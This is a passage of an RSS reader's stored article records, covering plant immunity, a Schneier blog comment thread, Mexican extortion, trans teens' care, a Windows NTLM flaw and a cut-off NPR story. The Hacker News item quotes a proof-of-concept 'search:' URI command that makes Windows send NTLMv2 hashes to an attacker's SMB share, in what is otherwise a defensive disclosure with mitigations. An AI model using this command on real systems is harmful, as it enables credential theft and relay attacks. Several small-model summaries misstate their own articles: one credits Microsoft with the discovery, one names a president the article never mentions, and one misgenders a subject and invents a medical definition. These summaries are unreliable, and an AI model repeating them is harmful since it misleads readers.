+`,content_text:`For decades, scientists have understood that plants can release volatile organic compounds—essentially airborne chemical signals—to attract the natural enemies of the things that eat them, like caterpillars. What we didn’t know was exactly how a plant translates the physical act of being eaten into a specific, predator-summoning distress signal. “[One] thing we didn’t know is how the plant detects the caterpillar in the first place,” says Adam Steinbrenner, a biologist at the University of Washington. Now, after years of experimenting with common bean plants in the lab and in the agricultural fields of Oaxaca, Mexico, Steinbrenner’s team pinpointed a single immune receptor that orchestrates its anti-caterpillar defense system. Drooling caterpillars When an herbivorous insect like a caterpillar feeds on a plant, it introduces its saliva straight into the plant's damaged tissues. This saliva contains biological clues called HAMPs: herbivore-associated molecular patterns. One of the HAMPs molecules is a peptide called inceptin, and there’s an 11-amino acid fragment of inceptin named In11, as well. Both of them turn out to be a fragment of the ATP synthase found in chloroplasts—basically a piece of one of the plant’s own proteins. As the caterpillar ingests the leaf, its gut enzymes chop up the plant's cellular engines and their pieces, including In11, are regurgitated back onto the leaf’s surface, albeit at extremely small concentrations. Read full article Comments`,cleaned_html:`<p>The article discusses a new discovery by researchers that identifies a single immune receptor in plants, specifically an ATP synthase, as a way to detect caterpillars. This receptor is involved in anti-caterpillar defense mechanisms by orchestrating an anti-microbial response using the ATP synthase enzyme found in chloroplasts.</p><p>### TITLE:<br>Beans use an immune receptor to call in airstrikes on caterpillars</p><p>### ARTICLE:<br>For decades, scientists have understood that plants can release volatile organic compounds—essentially airborne chemical signals—to attract the natural enemies of the things that eat them, like caterpillars. What we didn’t know was exactly how a plant translates the physical act of being eaten into a specific, predator-summoning distress signal. “One thing we didn't know is how the plant detects the caterpillar in the first place,” says Adam Steinbrenner, a biologist at the University of Washington. Now, after years of experimenting with common bean plants in the lab and in the agricultural fields of Oaxaca, Mexico, Steinbrenner's team pinpointed a single immune receptor that orchestrates its anti-caterpillar defense system. Drooling caterpillars When an herbivorous insect like a caterpillar feeds on a plant, it introduces its saliva straight into the plant's damaged tissues. This saliva contains biological clues called HAMPs: herbivore-associated molecular patterns. One of the HAMPs molecules is a peptide called inceptin, and there’s an 11-amino acid fragment of inceptin named In11, as well. Both of them turn out to be a fragment of the ATP synthase found in chloroplasts—basically a piece of one of the plant’s own proteins. As the caterpillar ingests the leaf, its gut enzymes chop up the plant's cellular engines and their pieces, including In11, are regurgitated back onto the leaf’s surface, albeit at extremely small concentrations. Read full article Comments</p>`,summary:`Scientists have identified a single immune receptor in plants that enables them to detect caterpillars using volatile organic compounds (VOCs) from their environment. This receptor orchestrates an anti-caterpillar defense system involving the ATP synthase enzyme found in chloroplasts, which is responsible for generating ATP, a critical energy molecule, as part of its cellular engines and some other components.
+
+• Nature of Plant Defense Mechanism: The study points out that plants have evolved to detect caterpillars through volatile organic compounds (VOCs) from their environment.
+• Immunoglobulin: Steinbrenner's team identified a single immune receptor in plants, likely named after the receptor they detected, which allows them to specifically recognize and respond to caterpillar consumption.
+• ATP Synthase Functionality: The study highlights that this receptor functions with ATP synthase (Asp149), providing insights into how plants generate ATP from their cellular components.
+• Implications for Other Insect Defenses: Understanding this mechanism could have implications for other insect pests and may lead to the development of more effective natural enemies.`,summary_model:`qwen2.5:0.5b`,image_url:`https://cdn.arstechnica.net/wp-content/uploads/2026/06/GettyImages-539781130-1152x648.jpg`,published_at:1780485307,fetched_at:1780509343,content_hash:`981fe442c167a7038d59e575e5827c5068ac9d4c8c548e4e0435de522aa1e052`,tags:`Science, beans, biochemistry`,is_read:!1,is_starred:!1,is_later:!0,dup_count:0},{id:30,feed_id:14,guid:`https://www.schneier.com/?p=72135`,url:`https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html`,title:`AI Used to Decrypt Medieval Ciphers`,author:`Bruce Schneier`,content_html:`<div id="readability-page-1" class="page"><div id="wrapper">
+
+			<header>
+				<p id="header">
+					<h2>
+						<a href="https://www.schneier.com/" rel="home">
+							Schneier on Security						</a>
+					</h2>
+				</p>
+			</header>
+
+			<nav>
+				<div id="header-nav">
+
+					<p><a href="#">
+						Menu						<span></span>
+					</a></p><div><ul id="menu-main-menu"><li id="menu-item-50175"><a href="https://www.schneier.com">Blog</a></li>
+<li id="menu-item-50916"><a href="https://www.schneier.com/crypto-gram/">Newsletter</a></li>
+<li id="menu-item-50166"><a href="https://www.schneier.com/books/">Books</a></li>
+<li id="menu-item-50169"><a href="https://www.schneier.com/essays/">Essays</a></li>
+<li id="menu-item-50170"><a href="https://www.schneier.com/news/">News</a></li>
+<li id="menu-item-50171"><a href="https://www.schneier.com/talks/">Talks</a></li>
+<li id="menu-item-50167"><a href="https://www.schneier.com/academic/">Academic</a></li>
+<li id="menu-item-50174"><a href="https://www.schneier.com/blog/about/">About Me</a></li>
+</ul></div>				</div>
+			</nav>
+
+			
+
+
+			<div id="content">
+
+				
+		<p id="breadcrumbs">
+
+			<a href="https://www.schneier.com">Home</a><a href="https://www.schneier.com/blog/archives/">Blog</a>		</p>
+
+		
+<article id="post-72135">
+
+	
+
+</article>
+
+
+	<h3 id="comments">Comments</h3>
+
+	
+		<article id="comment-454879">
+
+			<div>
+
+				<p>
+
+					<span>Clive Robinson</span> •
+
+					<a href="https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html/#comment-454879">
+						June 3, 2026 9:30 AM					</a>
+
+				</p>
+
+				<p>@ ALL,</p>
+<p>Overly simply all codes are about,</p>
+<p>“Hiding or flattening the statistics of plaintext in a reversible way.”</p>
+<p>Untill last century this was mostly done by chosen individuals by hand.</p>
+<p>This had certain implications that would make the hiding/flattening some what simple.</p>
+<p>One such would be “short key phrases”.</p>
+<p>Current AI LLM and ML systems are basically Statistical devices with a little random fuzzing thrown in.</p>
+<p>It does not take much imagination to see how AI could invert the statistics from the ciphertext by simply finding the statistics. Thus in effect multiply them out back to the plaintext.</p>
+<p>However that said it does not of necessity make the task any easier.</p>
+
+				
+			</div>
+
+		</article>
+
+		
+
+		<article id="comment-454882">
+
+			<div>
+
+				<p>
+
+					<span>KC</span> •
+
+					<a href="https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html/#comment-454882">
+						June 3, 2026 10:42 AM					</a>
+
+				</p>
+
+				<p>Will be fascinating to see how much progress the DESCRYPT project researchers make in decoding the <a href="https://www.tbsnews.net/world/how-ai-helping-historians-read-secrets-locked-away-centuries-1450911" rel="nofollow ugc">estimated 1%</a> of all archival material that remains fully or partially encrypted.</p>
+<p>For at least one document they had used an online platform <a href="https://www.transkribus.org/" rel="nofollow ugc">Transkribus</a>, that appears to host 300+ community AI models, to reveal it’s message; it had only been partly encrypted. They were also able to develop their own AI tool to work through some of the obscurities of their materials. Looks like a really neat project.</p>
+<p><a href="https://descrypt.org/" rel="nofollow ugc">https://descrypt.org/</a></p>
+<p>Browsing through DESCRYPT’s resources, also came across a nice mention of our host here:</p>
+<p><a href="https://www.cryptool.org/en/education/history/" rel="nofollow ugc">https://www.cryptool.org/en/education/history/</a></p>
+
+				
+			</div>
+
+		</article>
+
+		
+
+		<article id="comment-454883">
+
+			
+
+		</article>
+
+		
+
+		<article id="comment-454884">
+
+			<div>
+
+				<p>
+
+					<span>lurker</span> •
+
+					<a href="https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html/#comment-454884">
+						June 3, 2026 1:22 PM					</a>
+
+				</p>
+
+				<p>@Mexaly</p>
+<p>P’raps they have, and p’raps the AI is still shrugging,<br/>
+which is not an answer they would want us to know …</p>
+
+				
+			</div>
+
+		</article>
+
+		
+
+		<article id="comment-454885">
+
+			<div>
+
+				<p>
+
+					<span>Steve</span> •
+
+					<a href="https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html/#comment-454885">
+						June 3, 2026 1:34 PM					</a>
+
+				</p>
+
+				<p><i>There once was a man from Racine<br/>
+Who built him an AI machine<br/>
+Concave or convex<br/>
+It could decode any text<br/>
+But oh, what a monster to clean.</i></p>
+
+				
+			</div>
+
+		</article>
+
+		
+
+	<p>
+		<a href="https://www.schneier.com/blog/archives/2026/06/ai-used-to-decrypt-medieval-ciphers.html/feed/">
+			<img alt="Atom Feed" src="https://www.schneier.com/wp-content/themes/schneier/assets/images/rss.png"/>
+			Subscribe to comments on this entry		</a>
+	</p>
+
+		<div id="respond">
+		<h2>Leave a comment <small></small></h2>	</div>
+	
+	
+
+	
+<p id="powered">Sidebar photo of Bruce Schneier by Joe MacInnis.</p><p id="footer-credits">
+<a href="https://wordpress.com/website-builder/?partner_domain=www.schneier.com&amp;utm_source=Automattic&amp;utm_medium=colophon&amp;utm_campaign=Concierge%20Referral&amp;utm_term=www.schneier.com" rel="nofollow" target="_blank">Powered by WordPress</a> <a href="https://pressable.com/?utm_source=Automattic&amp;utm_medium=rpc&amp;utm_campaign=Concierge%20Referral&amp;utm_term=www.schneier.com" rel="nofollow" target="_blank">Hosted by Pressable</a></p>
+		</div>
+
+		
+
+
+		
+
+		</div></div>`,content_text:`Schneier on Security						
+					
+				
+			
+
+			
+				
+
+					
+						Menu						
+					Blog
+Newsletter
+Books
+Essays
+News
+Talks
+Academic
+About Me
+				
+			
+
+			
+
+
+			
+
+				
+		
+
+			HomeBlog		
+
+		
+
+
+	
+
+
+
+
+	Comments
+
+	
+		
+
+			
+
+				
+
+					Clive Robinson •
+
+					
+						June 3, 2026 9:30 AM					
+
+				
+
+				@ ALL,
+Overly simply all codes are about,
+“Hiding or flattening the statistics of plaintext in a reversible way.”
+Untill last century this was mostly done by chosen individuals by hand.
+This had certain implications that would make the hiding/flattening some what simple.
+One such would be “short key phrases”.
+Current AI LLM and ML systems are basically Statistical devices with a little random fuzzing thrown in.
+It does not take much imagination to see how AI could invert the statistics from the ciphertext by simply finding the statistics. Thus in effect multiply them out back to the plaintext.
+However that said it does not of necessity make the task any easier.
+
+				
+			
+
+		
+
+		
+
+		
+
+			
+
+				
+
+					KC •
+
+					
+						June 3, 2026 10:42 AM					
+
+				
+
+				Will be fascinating to see how much progress the DESCRYPT project researchers make in decoding the estimated 1% of all archival material that remains fully or partially encrypted.
+For at least one document they had used an online platform Transkribus, that appears to host 300+ community AI models, to reveal it’s message; it had only been partly encrypted. They were also able to develop their own AI tool to work through some of the obscurities of their materials. Looks like a really neat project.
+https://descrypt.org/
+Browsing through DESCRYPT’s resources, also came across a nice mention of our host here:
+https://www.cryptool.org/en/education/history/
+
+				
+			
+
+		
+
+		
+
+		
+
+			
+
+		
+
+		
+
+		
+
+			
+
+				
+
+					lurker •
+
+					
+						June 3, 2026 1:22 PM					
+
+				
+
+				@Mexaly
+P’raps they have, and p’raps the AI is still shrugging,
+which is not an answer they would want us to know …
+
+				
+			
+
+		
+
+		
+
+		
+
+			
+
+				
+
+					Steve •
+
+					
+						June 3, 2026 1:34 PM					
+
+				
+
+				There once was a man from Racine
+Who built him an AI machine
+Concave or convex
+It could decode any text
+But oh, what a monster to clean.
+
+				
+			
+
+		
+
+		
+
+	
+		
+			
+			Subscribe to comments on this entry		
+	
+
+		
+		Leave a comment 	
+	
+	
+
+	
+Sidebar photo of Bruce Schneier by Joe MacInnis.
+Powered by WordPress Hosted by Pressable`,cleaned_html:`<p>This article explores how artificial intelligence (AI) can be used to decrypt medieval ciphers, providing context about statistical algorithms and machine learning techniques. The author notes that current AI technology is limited in its ability to invert plaintext ciphertexts, emphasizing the potential for increased efficiency and speed compared to traditional cryptanalysis methods.</p><p>TITLE: <br>Schneier on Security<br>ARTICLE:<br>Overly simple codes are hiding or flattening the statistics of plaintext in a reversible way.<br>The use of statistical algorithms and machine learning techniques can effectively invert the original ciphertext by simply finding common patterns in plaintext.</p><p>Points:<br>- AI technology has made significant strides in breaking large-scale historical ciphers, highlighting its potential for increased efficiency and speed compared to traditional methods.<br>- Current AI systems are largely based on statistical devices with a little random fuzzing incorporated. They do not inherently take much imagination to see how AI could invert the statistics from ciphertexts.</p><p>CLEANED:<br>The use of statistical algorithms and machine learning techniques can effectively invert plaintext ciphers, providing context about current cryptographic advancements.</p>`,summary:`This article discusses the potential use of artificial intelligence (AI) to decrypt medieval ciphers. The author notes that using statistical algorithms and machine learning techniques can effectively invert the original ciphertext by simply finding common patterns in plaintext.
+
+• Shifting the focus from simple encryption methods to more complex decryption strategies.
+• Mentioning current AI technology and its limitations, particularly in dealing with statistics and randomness.
+• Highlighting the potential for increased efficiency and speed in modern cryptanalysis tasks compared to traditional brute-force methods.
+• Discussing efforts by researchers like DESCRYPT to aid in breaking large-scale historical ciphers.`,summary_model:`qwen2.5:0.5b`,published_at:1780484680,fetched_at:1780509343,content_hash:`fe418512c0b23a6455cab99e08ccbbddf2159bbb7a6e85813e07127489bb6529`,tags:`Uncategorized, AI, history of cryptography`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:70,feed_id:12,guid:`https://www.theguardian.com/world/2026/jun/03/how-can-mexico-confront-rise-in-deadly-extortion`,url:`https://www.theguardian.com/world/2026/jun/03/how-can-mexico-confront-rise-in-deadly-extortion`,title:`Kidnappings, threats and ‘protection fees’: how can Mexico confront rise in deadly extortion?`,author:`Oscar Lopez in Mexico City`,content_html:`<p>With corrupt police on the streets and shopkeepers forced to pay gangs, president has vowed to tackle crime that now affects all parts of society</p><p>It was about 11pm and Luis* was about to get into an Uber to go home when the police car pulled up. One of the officers frisked him and produced two plastic bags with what looked like drugs: one contained some sort of powder, the other little crystals. Luis had never seen them before.</p><p>Luis, who asked not to use his real name for fear of reprisals, insisted that the drugs weren’t his, but the officers didn’t seem to care. They shoved him into the back of the police truck and drove into the night.</p> <a href="https://www.theguardian.com/world/2026/jun/03/how-can-mexico-confront-rise-in-deadly-extortion">Continue reading...</a>`,content_text:`With corrupt police on the streets and shopkeepers forced to pay gangs, president has vowed to tackle crime that now affects all parts of society It was about 11pm and Luis* was about to get into an Uber to go home when the police car pulled up. One of the officers frisked him and produced two plastic bags with what looked like drugs: one contained some sort of powder, the other little crystals. Luis had never seen them before. Luis, who asked not to use his real name for fear of reprisals, insisted that the drugs weren’t his, but the officers didn’t seem to care. They shoved him into the back of the police truck and drove into the night. Continue reading...`,summary:`Mexico's President Andrés Manuel López Obrador has vowed to tackle crime and protect its citizens, including threats against those in positions of power, as he takes office with a mandate to combat the rise in deadly extortion.
+
+• The article discusses Mexico's current state of affairs, where corrupt police officers are on the streets and shopkeepers face pressure to pay gang members.
+• It mentions that Luis* was about to get into an Uber and had been informed by the police car that they were intercepting him for suspicion of drug trafficking, but he insisted it wasn't him.
+• The article indicates that these situations stem from a broader problem, where crime affects all parts of society, making it necessary for Mexico's leaders to address this issue head-on.`,summary_model:`qwen2.5:0.5b`,published_at:1780484404,fetched_at:1780509343,content_hash:`2ed61757f8afb237fd88cb1c562aa5683c79e67b806c88e0574fc3ffaa3e2a31`,tags:`Mexico, Organised crime, Americas`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:11,feed_id:3,guid:`https://www.theverge.com/?p=940977`,url:`https://www.theverge.com/features/940977/trans-teens-pediatric-care-closing`,title:`Trans teens have something to say`,author:`Grace Byron`,content_html:`
+
+						
+<figure>
+
+<img alt="Illustration in overlapping silhouettes and soft gradient of a child, a parent, and Donald Trump." data-caption="" data-portal-copyright="Vartika Sharma for The Verge, Getty Images" data-has-syndication-rights="1" src="https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/268514_trans_pediatrics_VSHARMA3.png?quality=90&#038;strip=all&#038;crop=0,0,100,100" />
+	<figcaption>
+		</figcaption>
+</figure>
+<p class="has-drop-cap has-text-align-none">By the time the Children's Hospital closed its doors to trans patients, Sage had already stopped taking testosterone. A nonbinary high school student, they originally received treatment for the rapid onset of puberty. The changes their body experienced felt frightening and sudden. They developed PMOS, a relatively common hormonal disorder that can lead to hair growth and irregular periods. The pandemic didn't help. Too much time to focus on scrutinizing the person in the mirror while doomscrolling. Their doctor first prescribed puberty blockers to help with their PMOS symptoms - not explicitly for trans-related reasons - and eventually recom …</p>
+<p><a href="https://www.theverge.com/features/940977/trans-teens-pediatric-care-closing">Read the full story at The Verge.</a></p>
+						`,content_text:`By the time the Children's Hospital closed its doors to trans patients, Sage had already stopped taking testosterone. A nonbinary high school student, they originally received treatment for the rapid onset of puberty. The changes their body experienced felt frightening and sudden. They developed PMOS, a relatively common hormonal disorder that can lead to hair growth and irregular periods. The pandemic didn't help. Too much time to focus on scrutinizing the person in the mirror while doomscrolling. Their doctor first prescribed puberty blockers to help with their PMOS symptoms - not explicitly for trans-related reasons - and eventually recom … Read the full story at The Verge.`,summary:`Sage, a nonbinary high school student who previously received testosterone treatment, now has to adjust to living without it. While she feels good about her new identity, she still struggles with hormonal changes caused by her trans status.
+
+• Sage stopped taking testosterone treatment when the Children's Hospital closed its doors to trans patients
+• PMOS (partial male presentation) is a common hormonal disorder that can lead to hair growth and irregular periods in transgender individuals
+• The pandemic didn't help Sage's doctor's initial prescription of puberty blockers for her PMOS symptoms, as she experienced scary changes due to the pandemic
+• Sage feels good about her new gender identity, but still needs time to process her experiences with hormonal changes caused by her trans status.`,summary_model:`qwen2.5:0.5b`,image_url:`https://platform.theverge.com/wp-content/uploads/sites/2/2026/06/268514_trans_pediatrics_VSHARMA3.png?quality=90&strip=all&crop=0,0,100,100`,published_at:1780484400,fetched_at:1780509343,content_hash:`9b39839d1a31bc3f65e54e3bc1e7eb3a62887062a00d052339d578e2d470302e`,tags:`Features, Health, Science`,is_read:!1,is_starred:!0,is_later:!1,dup_count:0},{id:78,feed_id:16,guid:`https://thehackernews.com/2026/06/unpatched-windows-search-uri.html`,url:`https://thehackernews.com/2026/06/unpatched-windows-search-uri.html`,title:`Unpatched Windows Search URI Vulnerability Lets Attackers Steal NTLMv2 Hashes`,author:`The Hacker News`,content_html:`<div id="readability-page-1" class="page"><div>
+<p><span>Vulnerability / Network Security</span></p></div><div id="articlebody"><p><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9Y4FY1kH_mrU4oH2X7TPrnmPdf9Ib4UZ4Xgud4Qgjie69on9qP9D1OU8i3ol3THTISUTy8OBJzPXzbUTyHwx1xF8cWuYvb9r-_7r_g-gFXyW62phdyaEAd41PI5cfduXxd084XQdwhxQ40Ti5n7SvkhIbZRktqP8G9bhufjlrxzxHYWpFTAXAfSSWstwc/s1600/NTLM.jpg"><img alt="" data-original-height="470" data-original-width="900" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9Y4FY1kH_mrU4oH2X7TPrnmPdf9Ib4UZ4Xgud4Qgjie69on9qP9D1OU8i3ol3THTISUTy8OBJzPXzbUTyHwx1xF8cWuYvb9r-_7r_g-gFXyW62phdyaEAd41PI5cfduXxd084XQdwhxQ40Ti5n7SvkhIbZRktqP8G9bhufjlrxzxHYWpFTAXAfSSWstwc/s1600/NTLM.jpg"/></a></p>
+<p>Cybersecurity researchers have disclosed details of an unpatched issue that could be exploited to disclose a user&#39;s NTLMv2 hash to the attacker.</p>
+
+<p>Like in the case of <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-33829">CVE-2026-33829</a>, which impacted the Windows Snipping Tool&#39;s ms-screensketch: URI handler, the newly flagged issue resides in the search: URI handler, per <a href="https://www.huntress.com/blog/unpatched-ntlm-leak-windows-search-uri-handler">Huntress</a>.</p>
+
+<p>CVE-2026-33829 refers to a spoofing vulnerability that could expose sensitive information to an unauthorized actor. It was patched by Microsoft in April 2026.</p>
+
+<p>&#34;An attacker could induce the user into clicking a specially crafted link in a Web browser or other URL source, by embedding it in a Web page or email message,&#34; Microsoft noted in its advisory at the time.</p>
+
+<p>&#34;If the user approves the launching of the link, the crafted URL can induce the computer to connect to an SMB server of the attacker&#39;s choosing, which would disclose the user&#39;s NTLMv2 hash to the attacker, who could use this to authenticate as the user.&#34;</p>
+
+<p>Specifically, the problem had to do with the fact that the Snipping Tool&#39;s URI handler accepted a &#34;filePath&#34; parameter, failed to validate it, and would reach out to any Universal Naming Convention (UNC) path passed to it. This, in turn, could trigger NTLM authentication and expose the victim&#39;s Net-NTLMv2 hash to the attacker.</p>
+
+<p>The newly discovered shortcoming achieves the same end goal using &#34;search:&#34; and &#34;crumb=location:&#34; instead of &#34;filePath&#34; using a command like below -</p>
+
+<pre><code>start &#34;&#34; &#34;search:query=test&amp;crumb=location:\\\\10.0.1.100\\share&#34;</code></pre>
+
+<p>&#34;It used the same NTLM leakage mechanism, produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating,&#34; Huntress researcher Andrew Schwartz said. It&#39;s worth noting that the use of a &#34;crumb&#34; parameter to steal the hash (<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-35636">CVE-2023-35636</a>) was <a href="https://www.varonis.com/blog/outlook-vulnerability-new-ways-to-leak-ntlm-hashes">documented</a> by Varonis in February 2024.</p>
+
+<p>As a result, a threat actor could leverage the captured hash to conduct relay attacks and gain deeper access into a network. Following responsible disclosure on April 15, 2026, Microsoft declined to address the issue, stating &#34;only Important and Critical severity cases meet our bar for servicing.&#34;</p>
+
+<p>In the absence of a fix, it&#39;s advised to block outbound SMB (TCP/445 and TCP/139) on hosts that don&#39;t need it, enforce SMB signing so that captured hashes can&#39;t be relayed against internal services, and disable NTLM where applicable.</p>
+
+<p>Found this article interesting?  Follow us on <a href="https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ" rel="noopener" target="_blank">Google News</a>, <a href="https://twitter.com/thehackersnews" rel="noopener" target="_blank">Twitter</a> and <a href="https://www.linkedin.com/company/thehackernews/" rel="noopener" target="_blank">LinkedIn</a> to read more exclusive content we post.</p>
+</div></div>`,content_text:`Vulnerability / Network Security
+Cybersecurity researchers have disclosed details of an unpatched issue that could be exploited to disclose a user's NTLMv2 hash to the attacker.
+
+Like in the case of CVE-2026-33829, which impacted the Windows Snipping Tool's ms-screensketch: URI handler, the newly flagged issue resides in the search: URI handler, per Huntress.
+
+CVE-2026-33829 refers to a spoofing vulnerability that could expose sensitive information to an unauthorized actor. It was patched by Microsoft in April 2026.
+
+"An attacker could induce the user into clicking a specially crafted link in a Web browser or other URL source, by embedding it in a Web page or email message," Microsoft noted in its advisory at the time.
+
+"If the user approves the launching of the link, the crafted URL can induce the computer to connect to an SMB server of the attacker's choosing, which would disclose the user's NTLMv2 hash to the attacker, who could use this to authenticate as the user."
+
+Specifically, the problem had to do with the fact that the Snipping Tool's URI handler accepted a "filePath" parameter, failed to validate it, and would reach out to any Universal Naming Convention (UNC) path passed to it. This, in turn, could trigger NTLM authentication and expose the victim's Net-NTLMv2 hash to the attacker.
+
+The newly discovered shortcoming achieves the same end goal using "search:" and "crumb=location:" instead of "filePath" using a command like below -
+
+start "" "search:query=test&crumb=location:\\\\10.0.1.100\\share"
+
+"It used the same NTLM leakage mechanism, produced the same Net-NTLMv2 leak, had the same prerequisites, and carried the same Moderate rating," Huntress researcher Andrew Schwartz said. It's worth noting that the use of a "crumb" parameter to steal the hash (CVE-2023-35636) was documented by Varonis in February 2024.
+
+As a result, a threat actor could leverage the captured hash to conduct relay attacks and gain deeper access into a network. Following responsible disclosure on April 15, 2026, Microsoft declined to address the issue, stating "only Important and Critical severity cases meet our bar for servicing."
+
+In the absence of a fix, it's advised to block outbound SMB (TCP/445 and TCP/139) on hosts that don't need it, enforce SMB signing so that captured hashes can't be relayed against internal services, and disable NTLM where applicable.
+
+Found this article interesting?  Follow us on Google News, Twitter and LinkedIn to read more exclusive content we post.`,cleaned_html:`<p>Unpatched Windows Search URI Vulnerability Leverages NTLMv2 Hash Exposure</p><p>Microsoft recently disclosed an unpatched vulnerability in the Windows Search URI handler, exposing a user's Net-NTLMv2 hash to an attacker. The issue affects the Snipping Tool and is similar to CVE-2026-33829, which impacted the MS Screensharing Tool's URI handler.</p><p>The newly discovered flaw relies on "search:" and "crumb=location:" parameters in URL query strings, while a command like start "" "search:query=test&amp;crumb=location:\\\\10.0.1.100\\share" would use "filePath" parameters.</p>`,summary:`Microsoft has discovered an unpatched Windows Search URI vulnerability that could expose a user's Net-NTLMv2 hash to an attacker. The issue affects the Snipping Tool and is similar to CVE-2026-33829, which impacted the MS Screensharing Tool's URI handler.
+
+• Microsoft disclosed the unpatched issue in April 2026.
+• It involves a spoofing vulnerability that could expose NTLMv2 hashes to an attacker.
+• A user clicking a specially crafted link can trigger NTLM authentication and reveal the victim's Net-NTLMv2 hash.
+• The newly discovered flaw relies on "search:" and "crumb=location:" parameters in URL query strings, while a command like start "" "search:query=test&crumb=location:\\\\10.0.1.100\\share" would use "filePath" parameters.`,summary_model:`qwen2.5:0.5b`,image_url:`https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9Y4FY1kH_mrU4oH2X7TPrnmPdf9Ib4UZ4Xgud4Qgjie69on9qP9D1OU8i3ol3THTISUTy8OBJzPXzbUTyHwx1xF8cWuYvb9r-_7r_g-gFXyW62phdyaEAd41PI5cfduXxd084XQdwhxQ40Ti5n7SvkhIbZRktqP8G9bhufjlrxzxHYWpFTAXAfSSWstwc/s1600/NTLM.jpg`,published_at:1780481932,fetched_at:1780509344,content_hash:`c331fd2080993fc5b8ef6409a08b1226d2580ebe71d51b6a9a3f488a1242cce6`,is_read:!1,is_starred:!1,is_later:!1,dup_count:0},{id:43,feed_id:10,guid:`https://www.npr.org/2026/06/03/nx-s1-5844793/ukrainian-drones-hit-st-petersburg`,url:`https://www.npr.org/2026/06/03/nx-s1-5844793/ukrainian-drones-hit-st-petersburg`,title:`Ukrainian drones strike a St. Petersburg oil terminal ahead of Putin visit`,author:`The Associated Press`,content_html:`<div id="readability-page-1" class="page"><div id="storytext">
+      <div id="resg-s1-125575">
+            <div data-crop-type="">
+        <picture>
+            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/400/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 400w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 800w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/900/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 900w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1200/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1200w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1600/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1800/quality/85/format/webp/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1800w" data-template="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/{width}/quality/{quality}/format/{format}/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg" sizes="(min-width: 1025px) 650px, calc(100vw - 30px)" type="image/webp"/>
+            <source srcset="https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/400/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 400w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/600/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 600w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/800/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 800w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/900/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 900w,
+https://npr.brightspotcdn.com/dims3/default/strip/false/crop/8640x5760+0+0/resize/1200/quality/85/format/jpeg/?url=http%3A%2F%2Fnpr-brightspot.s3.amazonaws.com%2F3b%2F2a%2F2d47ee3c42a3927e22c964a3f479%2Fap26154236654404.jpg 1200w,
